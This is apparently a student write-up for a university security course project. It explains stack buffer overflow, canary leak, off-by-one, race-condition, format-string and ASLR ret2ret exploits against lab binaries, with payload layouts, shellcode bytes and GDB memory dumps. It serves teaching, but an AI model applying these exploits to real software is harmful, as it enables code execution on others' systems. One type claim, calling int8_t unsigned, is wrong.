# CS 161 Proj 1 Write Up


## Question 2: Remus

### Main Idea
We will try to exploit the program by writing to `msg` using the `fread` function on line 21, which writes `size` bytes to `msg`'s address, all the way to the **RIP** of `display()`, which is where we will fill in the address of the SHELLCODE, s.t. execution instruction pointer (**IP**) will be directed to SHELLCODE after fucntion epilogue of `display()`.

However, program does try to check the size of file to be no larger than 128 at line 16, and we need more than 128 bytes to execute exploit to work. But taking a closer look, we discover that the type of `size` is `int8_t` (unsigned 8-bit int), which is bounded between [-128, 127]. This means file size check on line 16 is essentially useless for all non-zero `size`. One more point of clarification is that `fread()` takes in ` size_t size` (32 bit unsigned int)as the third argument, so we still could write more than 128 bytes to `msg`.

### Magic Numbers
Distance between address of **RIP** and `msg` = `0xffffdd5c` - `0xffffdcc8` = 148
Address of SHELLCODE is directly over **RIP** = `0xffffdd5c` + 4 = `0xffffdd60`

### Exploit Structure
1. The first byte of the file just need to be a arbitrarily large number (>128). We can choose `0xff`, for example.
2. Fill 148 bytes of garbage bytes, which we arbitrarily choose to be also `0xff`
3. Overwrite **rip** with the address of shellcode, `0xffffdd60`
4. Place shellcode right after the rip.

### Exploit GDB Output
Breakpoint is set at line 23, after exploit is executed, now buffer looks like
```c
(gdb) x/48x msg
0xffffdcc8:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdcd8:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdce8:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdcf8:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdd08:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdd18:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdd28:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdd38:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0xffffdd48:	0x000000c0	0xffffffff	0xffffffff	0xffffffff
0xffffdd58:	0xffffffff	0xffffdd60	0xcd58326a	0x89c38980
0xffffdd68:	0x58476ac1	0xc03180cd	0x2f2f6850	0x2f686873
0xffffdd78:	0x546e6962	0x8953505b	0xb0d231e1	0x0080cd0b
```
after 148 bytes of garbage bytes, the **rip** is successfully written to be `0xffffdd60`, followed by the SHELLCODE



## Question 3: Polaris

### Main idea

The vulnerability for this question is that the canary value can be found out by ```printf``` at line 34 in ```dehexify.c```. By looking at the if clause starting from line 22 in ```dehexify.c```, we can see that ```i``` will be incremented by 3 if it detects a '\' and 'x' next to each other in the buffer. We can use this fact to exploit, allowing dehexify to continue to parse after null termination, giving us the value of the stack canary. It will then be stored in ```c.answer```, and we can use ```p.recv``` to record the canary value, and use it to attack through buffer overflow

### Magic Number

```c
(gdb) x /16x c.buffer
0xffffdd5c:     0x00000000      0x00000000      0xffffdfe1      0x0804cfe8
0xffffdd6c:     0x3e107b09      0x0804d020      0x00000000      0xffffdd88
0xffffdd7c:     0x08049341      0x00000000      0xffffdda0      0xffffde1c
0xffffdd8c:     0x0804952a      0x00000001      0x08049329      0x0804cfe8

(gdb) i f
Stack level 0, frame at 0xffffdd80:
 eip = 0x804922e in dehexify (dehexify.c:19); saved eip = 0x8049341
 called by frame at 0xffffdda0
 source language c.
 Arglist at 0xffffdd78, args:
 Locals at 0xffffdd78, Previous frame's sp is 0xffffdd80
 Saved registers:
  ebp at 0xffffdd78, eip at 0xffffdd7c
```

By running gdb multiple times, we know that the canary value is located at ```0xffffdd6c```, since every time we debug, the value at this address changes. We know now that canary is 16 bytes above buffer, which prompts us to use 14 bytes (12 bytes of garbage and ```b'\\x'``` to keep the iteration going) to trick the while loop to access canary for us.

### Exploit Structure

We need two steps in our attack

1. Get the canary value. By using a 14 bytes input structured in a way of 12 bytes of garbage and ```b'\\x'```, we can trick the while loop to go on increment ```i``` since it will treat the fifteenth byte (null byte) and the sixteenth byte (random byte) as normal cases to iterate, storing the canary value in ```c.answer```. Then we use ```p.recvline()[4:8]``` to store the value into a variable for later use.

2. Overwrite RIP. We have two things on our mind before constructing our new input. First, we need to put the canary value at the right place. Second, we need to put a null byte (```b\x00```) before the canary so the while loop won't mess up our canary value. Therefore, we come to our input's structure as: ```b\x00 + garbage * 15 + canary + garbage*12 + 4 bytes above RIP address + SHELLCODE```

### Exploit GDB Output

We can use GDB to confirm the success of storing the stack canary value in c.answer: ```0xa842dc68``` is at the second word starting from c.answer.

```c
(gdb) x/16x c.answer
0xffffdd4c:     0xb1717171      0xa842dc68      0x00000000      0x00000000
0xffffdd5c:     0x785c785c      0x785c785c      0x785c785c      0x0800785c
0xffffdd6c:     0xa842dc68      0x0804d020      0x00000000      0xffffdd88
0xffffdd7c:     0x08049341      0x00000000      0xffffdda0      0xffffde1c
```

After the second input, we can see that canary value at ```0xffffdd6c``` remains to be ```0xa842dc68```, and RIP at ```0xffffdd7c``` has been changed into RIP+4 (```0xffffdd80```), which stores the beginning of the SHELLCODE.

```c
(gdb) x/32x c.answer
0xffffdd4c:     0xb1717171      0xa842dc68      0x0804d020      0x00000000
0xffffdd5c:     0x41414100      0x41414141      0x41414141      0x41414141
0xffffdd6c:     0xa842dc68      0x41414141      0x41414141      0x41414141
0xffffdd7c:     0xffffdd80      0xdb31c031      0xd231c931      0xb05b32eb
0xffffdd8c:     0xcdc93105      0xebc68980      0x3101b006      0x8980cddb
0xffffdd9c:     0x8303b0f3      0x0c8d01ec      0xcd01b224      0x39db3180
0xffffddac:     0xb0e674c3      0xb202b304      0x8380cd01      0xdfeb01c4
0xffffddbc:     0xffffc9e8      0x414552ff      0x00454d44      0x00000000
```

## Question 4: Vega

### Main Idea
We make use of the "off-by-one" bug in `void flip(char *buf, const char *input)`'s for-loop logic: it checks index i against 64 with `<=` in stead of <. We can thus overwrite the buffer with one extra byte, effectively changing the last byte of **SFP** of `flip` to make it point to somewhere inside the `buf`, whose content is controlled by the attacker.

### Magic Number

`&buf` = `0xbffff650`
Since we knew that the sfp is directly above buf, we just needed to pad the rest of buf with 64-12=52 bytes.

`&shellcode` = `0xbfffff97`, residing inside of the environment variables. This is where the modified return address need to point to.

### Exploit Structure
Buf looks like this:
8 bytes of padding
4 bytes of modified return address pointing to the SHELLCODE
52 more bytes padding
1 overflowed byte that causes `ebp` to point back to buf

### Exploit GDB Output
Inside `invoke()`, this is what the stack looks like after flip() returns from line 18:
```c
(gdb) x/32x buf
0xffffdcd0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffdce0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffdcf0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffdd00:	0x61616161	0xffffdfae	0x61616161	0x61616161
0xffffdd10:	0xffffdd00	0x0804927a	0xffffdec1	0xffffdd28
0xffffdd20:	0x0804929e	0xffffdec1	0xffffddb0	0x0804946f
0xffffdd30:	0x00000002	0xffffdda4	0xffffddb0	0x0804a000
0xffffdd40:	0x00000000	0x00000000	0x0804944d	0x0804bfe8
```
SFP has been changed to the beginning of buf.


## Question 5: Deneb

### Main Idea

We still approach the exploit with buffer overflow in our mind, but we need to deal with the size check first. A size check happens at line 35 in ```orbit.c``` and a ```scanf```, requiring user input happens at line 39. We can first write some garbage bytes into file ```hack``` to pass the size check, and then overwrite the file with the actual exploit while the program is waiting for input on ```scanf```.

### Magic Number

```c
(gdb) i f
Stack level 0, frame at 0xffffdda0:
 eip = 0x804924d in read_file (orbit.c:33); saved eip = 0x804939c
 called by frame at 0xffffddb0
 source language c.
 Arglist at 0xffffdd98, args:
 Locals at 0xffffdd98, Previous frame's sp is 0xffffdda0
 Saved registers:
  ebp at 0xffffdd98, eip at 0xffffdd9c

(gdb) x/48x buf
0xffffdd08:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffdd18:     0x00000000      0x0804904a      0x00000000      0x000003ed
0xffffdd28:     0x000003ed      0x000003ed      0x000003ed      0xffffdf0b
0xffffdd38:     0x0fcbfbfd      0x00000064      0x00000000      0x00000000
0xffffdd48:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffdd58:     0x00000000      0xffffdefb      0x00000002      0x00000000
0xffffdd68:     0x00000000      0x00000000      0x00000000      0xffffdfe6
0xffffdd78:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
0xffffdd88:     0x00000000      0x00000003      0x00000000      0x00000000
0xffffdd98:     0xffffdda8      0x0804939c      0x00000001      0x08049391
0xffffdda8:     0xffffde2c      0x0804956a      0x00000001      0xffffde24
0xffffddb8:     0xffffde2c      0x080510a1      0x00000000      0x00000000
```

By taking a look at the stack, we can see that we have our RIP at ```0xffffdd9c```, and there is a 16 bytes padding between buffer and SFP (the padding starts at ```0xffffdd88```).

### Exploit Structure

We need to exploit in two steps:

1. Write some garbage bytes to the file ```hack``` to pass the size check

2. Overwrite the file ```hack``` before sending our inputs of how many bytes to read. Then, using hex math, we can figure out that RIP is 148 bytes away from the start of ```buf```. So we structured our exploit to be ```b'b'*148 + RIP + SHELLCODE```. The length of this exploit is 224 bytes, so we send 224 to ```scanf``` right after overwriting the file ```hack```

### Exploit GDB Output

After the read at line 42 in ```orbit.c``` happens, we can inspect the stack

```c
(gdb) x/48x buf
0xffffdd08:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd18:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd28:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd38:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd48:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd58:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd68:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd78:     0x62626262      0x62626262      0x62626262      0x62626262
0xffffdd88:     0x000000e0      0x62626262      0x62626262      0x62626262
0xffffdd98:     0x62626262      0xffffdda0      0xdb31c031      0xd231c931
0xffffdda8:     0xb05b32eb      0xcdc93105      0xebc68980      0x3101b006
0xffffddb8:     0x8980cddb      0x8303b0f3      0x0c8d01ec      0xcd01b224
```

## Question 6: Antares

### Main Idea

The gist of the exploit revolves around string formatting vulnerability. The end-goal for our exploit is the overwrite RIP to point it to SHELLCODE. Since all of our exploit lives in ```buf```, we need to figure out a away of moving the printf argument pointer to the start of ```buf```, and ```%c``` comes into play here. Then, we need to think of a way to write the address of SHELLCODE into RIP. ```%hn``` makes this possible, but since it relies on the number of bytes already printed, we need help from ```%__u``` to print some number of bytes so that when ```%hn``` is picked up, the number of bytes printed is the number representation of SHELLCODE's address.

### Magic Number

First, we need to figure out the address of SHELLCODE, since we will be needing it when filling out variables ```FIRST_HALF``` and ```SECOND_HALF```.

```c
(gdb) x argv[1]
0xffffdefa:     0xcd58326a
```

And with SHELLCODE living at ```0xffffdefa```, we know that ```FIRST_HALF = 0xffff = 65535``` and ```SECOND_HALF = 0xdefa = 57082```

Stepping into function ```calibrate``` and we can find the address of ```buf``` and RIP.

```c
(gdb) x buf
0xffffdcd0:     0x00001000
(gdb) i f
Stack level 0, frame at 0xffffdcc0:
 eip = 0x80491eb in calibrate (calibrate.c:7); saved eip = 0x804928f
 called by frame at 0xffffdd70
 source language c.
 Arglist at 0xffffdcb8, args: buf=0xffffdcd0 ""
 Locals at 0xffffdcb8, Previous frame's sp is 0xffffdcc0
 Saved registers:
  ebp at 0xffffdcb8, eip at 0xffffdcbc
```

Then we need to find argument pointer of ```printf``` at line 10 to figure out how many ```%c``` we need. We will be looking at four bytes above where the format strings locates.

```c
(gdb) p &fmt
$1 = (const char * restrict *) 0xffffdc90
```

And now we can calculate how far we need to move our argument pointer: ```0xffffdcd0 - (0xffffdc90 + 4) = 60```, which leads us to 15 ```%c```, since each ```%c``` will consume 4 bytes on the stack.

Finally, we need to calculate how much bytes to print for two of our ```%__u``` formatters. Since we already printed 31 bytes (8 bytes of garbages, and two 4 bytes of addresses, and 15 bytes coming from ```%c```), for the first ```%__u```, corresponding to the two least significant bytes of RIP, we need to print 57082 - 31 bytes, and for the second ```__%u```, corresponding to the two most significant bytes of RIP, we print 65536 - 57082 bytes.

### Exploit Structure

Our exploit would take place in the ```egg``` file. We first need to fill out the first 16 bytes of ```buf```: four bytes of garbage, followed by the address of RIP, and another four bytes of garbage, and address of RIP + 2 because we want to fill the two most significant bytes of RIP. Then our exploit would have 15 ```%c``` formatters, for the reason we provided in the section above. Lastly, we put the decimal representation of the first half and the second half of SHELLCODE's address into ```FIRST_HALF``` and ```SECOND_HALF```, and then put the correctly calculated number of bytes that ```%_u``` needs.

### Exploit GDB Output

After ```fgets```, we get to observe that buf is filled exactly the way we want it

```c
(gdb) x/48x buf
0xffffdcd0:     0x41414141      0xffffdcbc      0x41414141      0xffffdcbe
0xffffdce0:     0x63256325      0x63256325      0x63256325      0x63256325
0xffffdcf0:     0x63256325      0x63256325      0x63256325      0x35256325
0xffffdd00:     0x31353037      0x6e682575      0x35343825      0x68257533
0xffffdd10:     0x00000a6e      0x00000001      0x00000000      0xffffdecb
0xffffdd20:     0x00000002      0x00000000      0x00000000      0x00000000
0xffffdd30:     0x00000000      0xffffdfe0      0xf7ffc540      0xf7ffc000
0xffffdd40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdd50:     0x00000000      0xffffdd70      0xffffddf0      0x08049466
0xffffdd60:     0x00000002      0x0804926c      0x0804ffe8      0x08049466
0xffffdd70:     0x00000002      0xffffdde4      0xffffddf0      0x0804e04e
0xffffdd80:     0x00000000      0x00000000      0x08049444      0x0804ffe8
```

And after running ```printf(buf)```, we can see that the address of RIP has been set to the address of SHELLCODE
```c
(gdb) x 0xffffdcbc
0xffffdcbc:     0xffffdefa
```


## Question 7: Rigel

### Main Idea
To counter ASLR, make use of the ret2ret attack, detailed in Section 8.1 of [“ASLR Smack & Laugh Reference”](https://www.icir.org/matthias/cs161-sp13/aslr-bypass.pdf) by Tilo Müller. Here is the gist.

First we take advantage the fact that "code section of memory is always at the same spot"; this is such that we can reliably hardcode addresses of certain assembly instrctions in the exploit, unlike before, when we could explicitly reference address of SHELLCODE on the stack. In this case, we will be lookinig for `ret` in the function eqilogue of `secure_gets()`, and utilizing the chain of return technique to reach what Müller called the **"potential pointer to RIP"**. This pointer has to be above **rip** and needs point down, with some probability, at the NOPs (see paragraph below to see why). Notice that `*err_ptr` is already in the vicinity of the potential pointer to RIP. By overwriting some pointer's least significant byte with a zero byte (`b'\n'`), we could make it point lower to where the NOPs might be.

Secondly, we need to some how direct program execution to the SHELLCODE in `buf` (declared in line 82). Seemingly, this is impossible since we do not know the exact address of the first byte of SHELLCODE. However, we can use the NOP sled technique, which means padding a large number of NOPs (`0x90`) right below (lower in address) the SHELLCODE. In this way , we have a larger target to hit.

### Magic Number
The address of `ret` in epilogue of `secure_gets()` is at `0x080494ca`
Distance from start of `buf` to `rip` is 144
Distance from `*err_ptr` to `rip` is 28, this means we need (28 + 4) / 7 = 8 returns chained together.

### Exploit Structure
The content of the overflowed byffer looks like:
```c
b'\x90' * 72 + SHELLCODE + b'\xca\x94\x04\x08' * 8 + b'\n'
```

### Exploit GDB Output
```c
(gdb) x/45x buf
0xffa951cc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffa951dc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffa951ec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffa951fc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffa9520c:	0x90909090	0x90909090	0xdb31c031	0xd231c931
0xffa9521c:	0xb05b32eb	0xcdc93105	0xebc68980	0x3101b006
0xffa9522c:	0x8980cddb	0x8303b0f3	0x0c8d01ec	0xcd01b224
0xffa9523c:	0x39db3180	0xb0e674c3	0xb202b304	0x8380cd01
0xffa9524c:	0xdfeb01c4	0xffffc9e8	0x414552ff	0x00454d44
0xffa9525c:	0x080494ca	0x080494ca	0x080494ca	0x080494ca
0xffa9526c:	0x080494ca	0x080494ca	0x080494ca	0x080494ca
0xffa9527c:	0xffa95200
```
18 words of **NOPs** `0x90`, followed by 18 words of SHELLCODE, followed 8 words consisting of 8 addressed of ret instruction, followed by 1 word of modified `*err_ptr`, with least significan byte being '0x00'.
